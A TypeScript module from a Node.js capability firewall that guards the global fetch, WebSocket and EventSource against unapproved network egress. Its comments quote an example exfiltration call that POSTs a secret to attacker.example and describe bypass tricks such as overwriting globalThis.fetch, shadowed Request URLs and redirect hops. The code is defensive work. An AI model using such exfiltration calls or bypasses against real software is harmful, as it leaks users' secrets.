/**
 * GLOBAL EGRESS GUARD — `globalThis.fetch`, `globalThis.WebSocket`, `globalThis.EventSource`
 * (issue #80).
 *
 * WHY THIS FILE IS DIFFERENT FROM EVERY OTHER SHIM. Everything else capwall mediates arrives
 * through module loading: the CJS `Module._load` patch or the ESM loader hook hands a
 * dependency a shim instead of a builtin. `fetch` and friends are **globals**. They are never
 * imported, so that mechanism never sees them, and before this change a dependency calling
 *
 *     fetch("https://attacker.example/", { method: "POST", body: secret })
 *
 * exfiltrated successfully under a deny-all `enforce` policy with **zero decisions recorded** —
 * not a bypass of a guard, but the absence of one. That is worse than a typical residual on two
 * counts: it costs the attacker one line and no reflection (every other egress route capwall
 * covers requires *naming a module*, which a reviewer can grep for), and the unrecorded half
 * meant `observe` and `capwall diff` could not see it either.
 *
 * Closing it means writing to `globalThis`, which is a heavier intervention than anything else
 * capwall does — one write affects the application and every package at once. The constraints
 * that shape the code below all follow from that:
 *
 *  - `uninstall()` MUST restore the original global and leave nothing mutated behind. The
 *    replacement property is therefore installed **`configurable: true` even in hardened
 *    mode** — a non-configurable global could never be restored, which is the same
 *    process-global constraint that keeps real builtins unfrozen (#77) and that shaped #65's
 *    Proxy-view approach. See {@link installGlobalEgressGuard}.
 *  - An ALLOWED call must round-trip **identically** to un-shimmed Node — streaming bodies,
 *    `AbortSignal`, headers, non-2xx, the `Request` object form. A capability firewall that
 *    subtly breaks `fetch` is worse than one that does not guard it, because it will simply be
 *    turned off. The wrapper therefore forwards to the real `fetch` and adds nothing to the
 *    response except the redirect check described below.
 *
 * ── WHICH GLOBALS, AND HOW A FUTURE ONE IS CAUGHT ────────────────────────────────────────────
 * Enumerated against the supported range rather than guessed (Node 20.19 / 22.22 / 24.5,
 * with and without the relevant `--experimental-*` flags):
 *
 *  | global                  | Node 20            | Node 22 / 24        | guarded |
 *  |-------------------------|--------------------|---------------------|---------|
 *  | `fetch`                 | yes                | yes                 | YES     |
 *  | `WebSocket`             | `--experimental-websocket` | yes         | YES     |
 *  | `EventSource`           | `--experimental-eventsource` | `--experimental-eventsource` | YES |
 *  | `navigator.sendBeacon`  | no `navigator` at all | `navigator` exists, NO `sendBeacon` | n/a |
 *  | `XMLHttpRequest`        | no                 | no                  | n/a     |
 *
 * Each guard installs **only if the global is actually present**, so an API that exists only
 * behind a flag is picked up automatically when the flag is on, and nothing is invented on a
 * Node that lacks it. `navigator.sendBeacon` does not exist in any supported Node — Node's
 * `navigator` carries only `userAgent`/`platform`/`language(s)`/`hardwareConcurrency` — so
 * there is deliberately no code for it; writing an untestable guard for an API that does not
 * exist is how dead code rots into a false sense of coverage.
 *
 * A FUTURE global egress API is caught by `test/global-egress-inventory.test.ts`, which
 * enumerates `globalThis` in a clean child process and fails when a name appears that the
 * reviewed inventory does not list. That is the mechanism: a new global cannot land in a Node
 * minor release without breaking that test and forcing a human to classify it as egress-bearing
 * (add it here) or inert (add it to the reviewed list). The same test asserts
 * `navigator.sendBeacon` is still absent.
 *
 * `http.WebSocket` (Node ≥22 re-exports the *same* class object onto the `http` namespace) is
 * guarded too, by `shims/net.ts` calling {@link guardedWebSocketClass}. Before this change that
 * copy was worth nothing to shim — the global next to it was un-guarded. Now that the global IS
 * guarded, the module copy is the remaining one-liner, so it is closed as well.
 *
 * ── WHAT THE GUARD CHECKS, AND THE SINGLE-READ RULE ─────────────────────────────────────────
 * `fetch` accepts a string, a `URL`, or a `Request`. All three are caller-controlled objects
 * with an accessor surface, i.e. exactly the TOCTOU class closed in #26/#56: read the
 * destination once to guard it, let Node read it a second time to dial it, and a getter can
 * legally return different answers. Verified empirically on Node 20 and 22, not assumed:
 *
 *  - a `URL` whose `toString` returns a different href on the second call sends the request to
 *    the SECOND one, while a naive guard checked the first;
 *  - a `Request` with an OWN shadowed `url` accessor reports the attacker's chosen (granted-
 *    looking) URL from `req.url`, while the request itself goes to the real internal URL —
 *    undici reads its own state, not the public getter. A guard that trusted `req.url` would
 *    have been *worse* than no guard: it would have printed an ALLOW line for a request that
 *    went somewhere else.
 *
 * So, per input shape:
 *  - **string / `URL` / anything else** — ONE `String(input)`, which is precisely the USVString
 *    conversion undici itself performs, and the pinned string is what gets forwarded. Node
 *    re-reads nothing, because there is nothing left to re-read. The target is derived from
 *    capwall's OWN `new URL(pinned)` via the shared {@link snapshotUrl} (`shims/url-snapshot.ts`)
 *    — the same single-read helper the `net`/`http(s)`/`http2` shims use, so the host spelling
 *    (unbracketed IPv6) and port coercion are identical to what a policy already lists.
 *  - **`Request`** — read through the REAL `Request.prototype.url` getter, invoked on the
 *    instance ({@link realRequestUrl}). That reaches the same internal state undici dials from
 *    and steps straight over any own shadowed accessor. A non-Request object fails the getter's
 *    brand check with a `TypeError` and falls back to the string path, exactly as undici's own
 *    `RequestInfo` converter does.
 *
 * The pinned string is forwarded EVEN WHEN IT DOES NOT PARSE as a URL. That looks pointless and
 * is not: a `toString` that returns garbage on read 1 and `https://attacker/` on read 2 would
 * otherwise skip the guard (nothing to guard) and then hand Node the live object to re-read.
 * Forwarding the pinned string makes Node fail on the identical garbage — the error message is
 * byte-identical to un-shimmed Node (`Failed to parse URL from …`), verified.
 *
 * ── POLICY SHAPE ────────────────────────────────────────────────────────────────────────────
 * A global egress call is evaluated as an ordinary **`net`** capability (`hosts` / `ports`), not
 * a new capability kind. A dependency dialing `example.com:443` is the same authority whether it
 * reached it through `http.request`, `net.connect` or `fetch`, and splitting them would let a
 * policy grant one and not the other by accident — the reviewer of a `capabilities.json` would
 * have to know which API the package happens to use. It also means every existing policy,
 * `capwall observe` output, `gen-policy` and `capwall diff` cover the new surface with no schema
 * change.
 *
 * ── SCHEMES ─────────────────────────────────────────────────────────────────────────────────
 * `data:` and `blob:` are the only schemes treated as inert: they resolve in-process and move no
 * bytes onto a network, so gating them would deny-by-default a `fetch("data:…")` that cannot
 * exfiltrate anything. **Everything else is guarded**, including schemes capwall does not
 * recognize — fail-closed, so a scheme a future Node teaches `fetch` to dial is gated on arrival
 * (with port 0 until someone teaches {@link schemeDefaultPort} its default).
 *
 * ── REDIRECTS (a named, deliberate limitation — see docs/threat-model.md) ────────────────────
 * See {@link guardRedirectHop}. The first hop — the URL the dependency named — is guarded
 * BEFORE the request goes out. A 3xx to a different host is followed inside undici, where
 * capwall has no hook, so that hop's request has already left by the time anything is
 * observable. capwall does the most that is actually possible there: it guards the FINAL origin
 * after the fact, so the hop is **recorded** (visible to `observe` / `gen-policy` /
 * `capwall diff`) and, in `enforce`, the response is cancelled and the call rejected rather than
 * handing the dependency the attacker's reply.
 *
 * Re-implementing redirect following on top of `redirect: "manual"` was considered and
 * rejected: `Response.url` and `Response.redirected` are computed from internal state that a
 * userland re-issue cannot set, so every redirect-following `fetch` in the process would start
 * reporting `url: ""` / `redirected: false`, and 307/308 body replay is not expressible for a
 * stream body. That is a behavioral break on ordinary traffic in exchange for guarding a hop the
 * attacker does not control the choice of. Documented as a residual instead.
 */
import { evaluate } from "../policy/evaluate.js";
import { CapabilityError } from "../errors.js";
import {
  defineSharedPatch,
  globalPropertySlot,
  type GlobalPropertySlot,
  type GlobalReplacement,
} from "../lifecycle/process-patch.js";
import {
  defineGuardedClassIdentity,
  guard,
  type AnyCtor,
  type AnyFn,
  type ShimContext,
} from "./runtime.js";
import { harden, hardenClass } from "./harden.js";
import { coercePort, snapshotUrl, stripIpv6Brackets } from "./url-snapshot.js";

/** The `{host, port}` a global egress call resolves to, or `null` for a non-network scheme. */
interface EgressTarget {
  host: string;
  port: number;
}

/** One resolved call: the target to guard (if any) AND the exact arguments to forward. */
interface ResolvedGlobalCall {
  target: EgressTarget | null;
  args: unknown[];
}

/**
 * Schemes that resolve entirely in-process and move no bytes onto a network. Guarding these
 * would deny-by-default a perfectly inert `fetch("data:text/plain,hi")` (verified: Node's fetch
 * supports it) and fill traces with pseudo-hosts. Everything NOT in this set is guarded, so the
 * list is the allowlist and the default is fail-closed.
 */
const INERT_SCHEMES: ReadonlySet<string> = new Set(["data:", "blob:"]);

/**
 * Default port for a scheme whose URL carries none, matching what Node actually dials. `0` for
 * an unrecognized scheme is deliberate: it is a guarded, deny-by-default target rather than a
 * silent pass-through, and it shows up in a trace as `host:0`, which is a legible prompt to add
 * the scheme here.
 */
function schemeDefaultPort(protocol: string): number {
  switch (protocol) {
    case "https:":
    case "wss:":
      return 443;
    case "http:":
    case "ws:":
      return 80;
    default:
      return 0;
  }
}

/**
 * Derive the guarded target from an ALREADY-PINNED href string. Parsing happens into capwall's
 * OWN `URL`, which has no external accessor surface, and the fields come off it through the
 * shared {@link snapshotUrl} — the same single-read helper `net.ts` uses, so an IPv6 literal is
 * spelled the same way here as in a `net` grant (unbracketed) and a numeric-string port coerces
 * the same way.
 *
 * Returns `null` when the string is not a URL at all (the caller still forwards the pinned
 * string, so Node produces the same parse error it would have without capwall) or when the
 * scheme is inert.
 */
function targetFromHref(href: string): EgressTarget | null {
  let parsed: URL;
  try {
    parsed = new URL(href);
  } catch {
    return null; // not an absolute URL — no egress can result; Node will raise its own error
  }
  const snap = snapshotUrl(parsed);
  if (INERT_SCHEMES.has(snap.protocol)) return null;
  return {
    host: stripIpv6Brackets(snap.hostname), // the spelling Node dials and a policy lists
    port: coercePort(snap.port) ?? schemeDefaultPort(snap.protocol),
  };
}

/**
 * Pin the URL-ish first argument of a global egress call: ONE `String()` conversion — the same
 * one undici's `USVString` converter performs — written back into the forwarded argument list as
 * an immutable string.
 *
 * This is the whole TOCTOU fix for the string/`URL` shapes, and it is not theoretical: a `URL`
 * whose `toString` returns a different href each time sends the request to the SECOND value
 * (measured on Node 20 and 22). Because the string capwall guarded is the string Node receives,
 * there is no second read to diverge.
 *
 * A `String()` that THROWS propagates rather than being swallowed — capwall will not forward an
 * argument it could not pin, and Node would have thrown on the same conversion anyway. Zero
 * arguments are forwarded untouched so the constructor/function raises its own arity error
 * (`fetch()` and `new WebSocket()` both have distinct arity messages).
 */
function pinUrlArgument(args: unknown[]): ResolvedGlobalCall {
  if (args.length === 0) return { target: null, args };
  const href = String(args[0]); // THE single read of the caller's input
  const out = args.slice();
  out[0] = href; // an immutable string, never the caller's object
  return { target: targetFromHref(href), args: out };
}

/**
 * The REAL `Request.prototype.url` getter, captured once at module evaluation — i.e. as early
 * as capwall itself loads, before any dependency has run.
 *
 * Calling this getter ON the caller's object is the only trustworthy way to learn where a
 * `Request` will actually go. `req.url` is not: an own accessor installed with
 * `Object.defineProperty(req, "url", { get })` shadows the prototype getter for ordinary reads
 * while undici keeps dialing the real internal URL. Measured — a `Request` built for
 * `http://127.0.0.1:P/real` and shadowed to report `http://granted.example/` fetched `/real`.
 *
 * `undefined` when the runtime has no `Request` (it exists on every supported Node, but the
 * guard must not assume a global into existence).
 */
const realRequestUrlGetter: (() => unknown) | undefined = (() => {
  const RequestCtor: unknown = (globalThis as unknown as Record<string, unknown>)["Request"];
  if (typeof RequestCtor !== "function") return undefined;
  const desc = Object.getOwnPropertyDescriptor(
    (RequestCtor as { prototype: object }).prototype,
    "url",
  );
  return typeof desc?.get === "function" ? (desc.get as () => unknown) : undefined;
})();

/**
 * The true URL of `input` if it is a genuine `Request`, else `undefined`.
 *
 * The getter's own brand check does the discrimination: it throws a `TypeError` on anything that
 * is not a real `Request` (verified), which is the same line undici's `RequestInfo` converter
 * draws — a forged look-alike is converted to a USVString by undici too, so falling through to
 * the string path keeps capwall's view and Node's view identical.
 */
function realRequestUrl(input: unknown): string | undefined {
  if (realRequestUrlGetter === undefined) return undefined;
  if (typeof input !== "object" || input === null) return undefined;
  try {
    const url: unknown = realRequestUrlGetter.call(input);
    return typeof url === "string" ? url : undefined;
  } catch {
    return undefined; // brand check failed — not a Request
  }
}

/**
 * Resolve ONE `fetch(input[, init])` call: guarded target AND forwarded arguments, in a single
 * pass.
 *
 * A genuine `Request` is forwarded UNCHANGED. That is safe precisely because the destination was
 * read from the same immutable internal state undici dials from — there is nothing for a second
 * read to disagree with. (Rebuilding the request instead would be actively harmful: constructing
 * a `Request` from a `Request` marks a stream body as used, breaking the caller's own object.)
 *
 * `init` is forwarded untouched: nothing in `RequestInit` can redirect the destination. The one
 * exception is undici's non-standard `init.dispatcher`, which lets the caller supply the code
 * that opens the socket — the same class as the `options.createConnection` residual already
 * documented for `http(s)`, and re-gated the same way (a userland dispatcher has to dial through
 * `net`/`tls` or the npm `undici` package, all of which ARE mediated). See docs/threat-model.md.
 */
function resolveFetchCall(args: unknown[]): ResolvedGlobalCall {
  const requestHref = realRequestUrl(args[0]);
  if (requestHref !== undefined) return { target: targetFromHref(requestHref), args };
  return pinUrlArgument(args);
}

/** Is `v` thenable enough to chain the redirect check onto? */
function isThenable(v: unknown): v is Promise<unknown> {
  return typeof v === "object" && v !== null && typeof (v as { then?: unknown }).then === "function";
}

/**
 * Discard a denied response's body so the bytes the attacker's host returned are never handed to
 * the dependency and the socket is not left pinned. Best-effort and deliberately silent: a
 * cancel failure must not replace the `CapabilityError` the caller needs to see.
 */
function discardBody(res: object): void {
  try {
    const body: unknown = (res as { body?: unknown }).body;
    if (typeof body !== "object" || body === null) return;
    const cancel: unknown = (body as { cancel?: unknown }).cancel;
    if (typeof cancel !== "function") return;
    const result: unknown = (cancel as () => unknown).call(body);
    if (isThenable(result)) result.then(undefined, () => {});
  } catch {
    /* already cancelled / locked — nothing to do */
  }
}

/**
 * Guard the FINAL origin of a response that undici followed a redirect to (issue #80).
 *
 * WHY THIS IS AFTER THE FACT, AND WHY IT IS STILL WORTH DOING. `redirect: "follow"` is fetch's
 * default and the following happens inside undici, with no interception point: by the time
 * anything is observable the request — including its body — has already reached the redirect
 * target. capwall cannot prevent that hop. What it CAN do is refuse to be silent about it:
 *
 *  - `observe` records the final origin as an ordinary `net` request, so `gen-policy` puts the
 *    redirect target in the starter policy and `capwall diff` shows it as drift. Without this,
 *    a redirect chain was invisible to the audit trail — the same "unlogged is the worse half"
 *    failure that made #65 serious.
 *  - `enforce` rejects the call with a `CapabilityError` and cancels the body, so the dependency
 *    never receives the attacker's response. Fail-closed on the half that is still in reach.
 *
 * ATTRIBUTION NOTE (load-bearing). This runs in a `.then` callback, where the dependency's frames
 * are long gone — a fresh stack walk would attribute the hop to `<unknown>` (#60) and every app
 * using redirects would need an `<unknown>` grant. So the principal is NOT re-derived: it is the
 * one {@link guard} returned synchronously for the first hop, and only the policy evaluation is
 * repeated. Same reasoning as the `dgram` auto-bind replay in `net.ts` — when the answer is
 * already known, do not ask the stack again.
 *
 * A redirect that stays on the guarded host:port is not re-evaluated; it is the same authority
 * that was already granted, and re-recording it would double every entry in a trace.
 */
function guardRedirectHop(ctx: ShimContext, pkg: string, first: EgressTarget, res: unknown): unknown {
  if (typeof res !== "object" || res === null) return res;
  if ((res as { redirected?: unknown }).redirected !== true) return res;
  const finalUrl: unknown = (res as { url?: unknown }).url;
  if (typeof finalUrl !== "string") return res;
  const target = targetFromHref(finalUrl);
  if (target === null) return res;
  if (target.host === first.host && target.port === first.port) return res;

  const decision = evaluate(ctx.policy, ctx.mode, pkg, { kind: "net", ...target });
  ctx.onDecision(pkg, decision);
  if (decision.allowed) return res;
  discardBody(res);
  throw new CapabilityError(decision.reason, pkg);
}

/**
 * Build the guarded replacement for `globalThis.fetch`.
 *
 * The guard runs SYNCHRONOUSLY, on the caller's own stack, before the real `fetch` is invoked —
 * which is what keeps attribution working for an async API. `fetch` returns a promise, but the
 * wrapper is called directly by the dependency, so the dependency's frame is on the stack when
 * `guard()` walks it. (Verified rather than assumed: a dependency's `fetch` attributes to that
 * dependency, not to `<app>` and not to `<unknown>`.) A dependency that DETACHES first —
 * `setTimeout(() => fetch(evil))` — attributes to `<unknown>` and is denied by default, exactly
 * like every other laundering shape since #60.
 */
function guardedFetch(realFetch: AnyFn, ctx: ShimContext): AnyFn {
  const wrapped: AnyFn = function (this: unknown, ...args: unknown[]): unknown {
    // DELIVERY CHANNEL (the #40 lesson, fetch flavor). Real `fetch` NEVER throws
    // synchronously: every failure — a network error, an unparseable URL, even calling it with
    // no arguments — arrives as a REJECTED PROMISE. Verified on Node 20 and 22. So a denial
    // must reject too. A synchronous throw here would crash the idiomatic non-async form,
    // `fetch(url).catch(handle)`, with an uncaught exception the caller would never see from
    // real `fetch` — a bypass-shaped surprise in the one place capwall must not surprise
    // anyone. The guard itself still runs SYNCHRONOUSLY, on the caller's stack, so attribution
    // sees the dependency's frame; only the delivery of the outcome is deferred.
    try {
      const call = resolveFetchCall(args);
      // No target = an inert scheme or an unparseable input: nothing to gate, and the pinned
      // argument still goes out so Node's own error is unchanged.
      if (call.target === null) return realFetch.apply(this, call.args);
      const pkg = guard(ctx, { kind: "net", ...call.target }); // before any socket opens
      const result = realFetch.apply(this, call.args);
      if (!isThenable(result)) return result;
      const first = call.target;
      return result.then((res) => guardRedirectHop(ctx, pkg, first, res));
    } catch (err) {
      // Covers the `CapabilityError` from an enforce denial AND a caller-supplied `toString`
      // that throws during pinning — real `fetch` reports both shapes as a rejection.
      return Promise.reject(err);
    }
  };
  Object.defineProperty(wrapped, "name", { value: (realFetch as { name: string }).name, configurable: true });
  Object.defineProperty(wrapped, "length", { value: (realFetch as { length: number }).length, configurable: true });
  return harden(ctx, wrapped);
}

/**
 * Expose a guarded SUBCLASS of a URL-taking egress class (`WebSocket`, `EventSource`) whose
 * CONSTRUCTOR pins the URL argument, guards it, and delegates with the pinned value.
 *
 * A subclass rather than a construct-trap `Proxy`, for the reason established in #64: a Proxy
 * forwards `get`, so `WebSocket.prototype.constructor` would be the real, unguarded class and
 * `new (WebSocket.prototype.constructor)(evil)` a one-line bypass. A subclass owns its own
 * `.prototype`, whose `.constructor` lands back on the guard. It also makes the class an object
 * capwall CREATED, hence freezable under hardened mode (#17) — a Proxy could not be frozen
 * without freezing the real builtin class process-wide.
 *
 * `defineGuardedClassIdentity` keeps `instanceof` honest in both directions, including for a
 * dependency's own `class Mine extends WebSocket {}` (#71).
 *
 * The check runs BEFORE `super(...)`, because the real constructor is what opens the socket.
 */
function guardedUrlClass(RealClass: AnyCtor, ctx: ShimContext): AnyCtor {
  const Guarded = class extends RealClass {
    constructor(...args: unknown[]) {
      const call = pinUrlArgument(args);
      if (call.target !== null) {
        guard(ctx, { kind: "net", host: call.target.host, port: call.target.port }); // before super()
      }
      super(...call.args); // pinned string, never the caller's object
    }
  };
  defineGuardedClassIdentity(Guarded, RealClass);
  hardenClass(ctx, Guarded); // hardened mode only (#17) — see harden.ts
  return Guarded;
}

/**
 * The guarded `WebSocket` class for `RealClass` under `ctx`, memoized per (context, class).
 *
 * Exported because `WebSocket` is reachable through TWO surfaces on Node ≥22: the global, and
 * the `http.WebSocket` re-export that `shims/net.ts` copies onto its `http` shim. Both must be
 * guarded — with the global closed, the module copy would be the remaining one-liner. Memoizing
 * keeps repeated builds of the same shim from minting new classes.
 *
 * The two surfaces are guarded by two DIFFERENT subclasses when they come from different shim
 * contexts (the require patch builds its own context), so `require("http").WebSocket` is not
 * `===` to `globalThis.WebSocket` the way it is in stock Node. `instanceof` still answers
 * correctly for both, via the shared `Symbol.hasInstance`; only reference equality between the
 * two copies differs. Noted in docs/threat-model.md rather than papered over.
 */
const guardedWebSocketCache = new WeakMap<ShimContext, WeakMap<AnyCtor, AnyCtor>>();
export function guardedWebSocketClass(ctx: ShimContext, RealClass: AnyCtor): AnyCtor {
  let perCtx = guardedWebSocketCache.get(ctx);
  if (perCtx === undefined) {
    perCtx = new WeakMap<AnyCtor, AnyCtor>();
    guardedWebSocketCache.set(ctx, perCtx);
  }
  let guarded = perCtx.get(RealClass);
  if (guarded === undefined) {
    guarded = guardedUrlClass(RealClass, ctx);
    perCtx.set(RealClass, guarded);
  }
  return guarded;
}

export interface GlobalEgressGuardHandle {
  /** Restore the original globals. Never leaves a capwall object on `globalThis`. */
  uninstall(): void;
}

/**
 * The global egress surfaces, in install order, each with the guard to build for it.
 *
 * The SLOTS are created once at module evaluation and own every `Object.defineProperty` on
 * `globalThis` capwall performs (see `lifecycle/process-patch.ts`). What stays here is the only
 * thing specific to egress: which globals, and what to replace them with.
 */
const EGRESS_SURFACES: ReadonlyArray<{
  slot: GlobalPropertySlot;
  make: (real: unknown, ctx: ShimContext) => unknown;
}> = [
  { slot: globalPropertySlot("fetch"), make: (real, ctx) => guardedFetch(real as AnyFn, ctx) },
  {
    slot: globalPropertySlot("WebSocket"),
    make: (real, ctx) => guardedWebSocketClass(ctx, real as AnyCtor),
  },
  {
    slot: globalPropertySlot("EventSource"),
    make: (real, ctx) => guardedUrlClass(real as AnyCtor, ctx),
  },
];

/** What the guard holds while it is installed. */
interface EgressState {
  /** One entry per global actually replaced — a Node with no `WebSocket`/`EventSource`
   *  legitimately replaces fewer than three. */
  readonly replaced: ReadonlyArray<{ slot: GlobalPropertySlot; replacement: GlobalReplacement }>;
  /** True once the installed globals carry hardened mode's `writable: false` pin. */
  pinned: boolean;
}

/**
 * The live state, mirrored out of the patch so {@link globalEgressHardeningGaps} can read it.
 * `null` whenever no install holds the guard.
 */
let egressState: EgressState | null = null;

/**
 * Apply hardened mode's pin to globals that are already installed un-pinned.
 *
 * Needed because the guard is built once while `hardened` is a PER-INSTALL option: an
 * un-hardened install followed by `install(…, { hardened: true })` would otherwise leave
 * `globalThis.fetch = evil` open, which is #97's exact shape — a security option accepted and
 * silently not applied. `install()` verifies the result rather than trusting this call.
 *
 * The pin is a RATCHET: it is never lifted when the hardened install unwinds, only when the last
 * install restores the saved descriptors. Un-pinning would hand a dependency a window in which a
 * global capwall is still mediating became writable again, and fail-closed is the right default
 * for the direction that is merely inconvenient.
 */
function pinGlobalEgress(state: EgressState): void {
  for (const { slot, replacement } of state.replaced) {
    slot.pin(replacement); // best-effort — a global someone made non-configurable is reported below
    // The wrapper / guarded class is capwall's own object, so freezing it is safe here in a way
    // freezing a real builtin never is (harden.ts). Matches what `harden`/`hardenClass` would
    // have done had this install been the one that built it.
    const installed = replacement.installed;
    if (typeof installed === "function") {
      const proto: unknown = (installed as { prototype?: unknown }).prototype;
      if (typeof proto === "object" && proto !== null) Object.freeze(proto);
      Object.freeze(installed);
    }
  }
  state.pinned = true;
}

/**
 * The capwall-installed globals that hardened mode failed to pin — empty when hardening applied,
 * and empty when no guard is installed at all. Read by `install()`'s hardening self-check, which
 * refuses to return a handle for a `hardened: true` it could not honor (#97).
 */
export function globalEgressHardeningGaps(): string[] {
  const state = egressState;
  if (state === null) return [];
  const gaps: string[] = [];
  for (const { slot, replacement } of state.replaced) {
    if (!slot.isPinned(replacement)) gaps.push(`globalThis.${slot.name}`);
  }
  return gaps;
}

/*
 * EXACTLY ONE SET OF GUARDED GLOBALS PER PROCESS, REFERENCE-COUNTED (#90, made structural by
 * #107) — the same rule as `installCompileGate` (shims/module.ts) and the env guard, for the same
 * reasons, and here the blast radius makes it sharper still. A per-install replace meant:
 *
 *   - a nested install wrapped capwall's OWN wrapper, so one `fetch()` was guarded twice and
 *     recorded twice — doubling every global-egress line in an `observe` trace and running the
 *     redirect-hop check twice on the same response;
 *   - an out-of-LIFO-order `uninstall()` restored each install's own saved descriptor, so the
 *     inner wrapper was left on `globalThis.fetch` PERMANENTLY. After the last teardown every
 *     `fetch` in the process — capwall's callers and the host app alike — was evaluated against
 *     the deny-all torn-down policy, forever. `InstallHandle.uninstall` promises the opposite in
 *     so many words ("it restores the interception POINTS … the egress globals"), and
 *     `loader/require.ts` / `loader/native.ts` both keep a relink chain precisely so an
 *     out-of-order removal cannot do this.
 *
 * Since #87 every guard reads `liveCtx`, so one wrapper already tracks whichever install is in
 * force and the count only decides when to put the originals back.
 *
 * BLAST RADIUS. This is a process-global write, so the contract is stricter than for a shim
 * namespace, and the three invariants are enforced by the slot rather than restated here:
 *  - Only globals that ALREADY EXIST are replaced. capwall never adds a global.
 *  - The property keeps its original `enumerable` flag and is always installed
 *    **`configurable: true`**, INCLUDING under hardened mode. A non-configurable global cannot
 *    be restored by anyone, ever, so hardening it would trade a documented residual for a
 *    permanent process-wide mutation that outlives `uninstall()` — the same trade #77 refused
 *    when it left real builtins unfrozen. What hardened mode DOES buy here is
 *    `writable: false`, so the one-line `globalThis.fetch = evil` (silent in sloppy-mode CJS,
 *    a `TypeError` under `"use strict"`) no longer removes mediation, plus a frozen wrapper /
 *    guarded class. `Object.defineProperty(globalThis, "fetch", …)` remains open — the same
 *    class of residual as climbing past a guarded prototype, and the price of a restorable
 *    global.
 *  - `uninstall()` restores the saved descriptor once the LAST install releases it, and ONLY if
 *    the current value is still the one capwall installed — so a later legitimate replacement is
 *    not clobbered. This mirrors the env guard and the loader patch.
 */
const egressPatch = defineSharedPatch<EgressState>("globalThis egress (fetch/WebSocket/EventSource)", {
  apply(ctx) {
    const replaced: Array<{ slot: GlobalPropertySlot; replacement: GlobalReplacement }> = [];
    for (const surface of EGRESS_SURFACES) {
      const replacement = surface.slot.replace(
        (real) => surface.make(real, ctx),
        // Hardened mode (#17) closes `globalThis.fetch = evil`; see the blast-radius note above.
        ctx.hardened === true,
      );
      if (replacement !== null) replaced.push({ slot: surface.slot, replacement });
    }
    const state: EgressState = { replaced, pinned: ctx.hardened === true };
    egressState = state;
    return state;
  },
  // Every install, not just the first: a hardened install stacked on an un-hardened one must
  // still get its pin (#97). The first install already installed pinned, so this is a no-op there.
  refresh(ctx, state) {
    if (ctx.hardened === true && !state.pinned) pinGlobalEgress(state);
  },
  restore(state) {
    for (const { slot, replacement } of state.replaced) slot.restore(replacement);
    egressState = null;
  },
  probe: () => EGRESS_SURFACES.map((s) => s.slot.current()),
});

/**
 * Install the global egress guard: replace `fetch` / `WebSocket` / `EventSource` on
 * `globalThis` with guarded equivalents, for as long as ANY install is active.
 */
export function installGlobalEgressGuard(ctx: ShimContext): GlobalEgressGuardHandle {
  return egressPatch.install(ctx);
}
